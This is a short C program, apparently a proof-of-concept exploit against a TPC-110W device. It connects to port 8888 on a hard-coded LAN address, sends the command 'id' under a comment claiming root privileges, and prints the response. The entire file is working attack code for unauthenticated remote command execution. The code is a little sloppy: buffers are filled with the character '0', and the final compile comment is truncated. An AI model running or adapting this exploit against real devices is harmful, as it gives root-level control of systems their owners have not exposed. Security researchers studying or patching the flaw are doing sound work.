#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    int sock;
    struct sockaddr_in serv_addr;
    char command[512];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        exit(1);
    }

    memset(&serv_addr, '0', sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(8888); // The default port of TPC-110W is 8888
    if (inet_pton(AF_INET, "192.168.1.10", &serv_addr.sin_addr) <= 0) { // Assuming the device's IP address is 192.168.1.10
        perror("inet_pton");
        exit(1);
    }

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("connect");
        exit(1);
    }

    // Run command with root privileges
    snprintf(command, sizeof(command), "id\n"); // Check user id
    write(sock, command, strlen(command));

    memset(command, '0', sizeof(command));
    read(sock, command, sizeof(command));
    printf("%s\n", command);

    close(sock);
    return 0;
}

//gcc -o tpc-110w-exploit tpc-110w-exp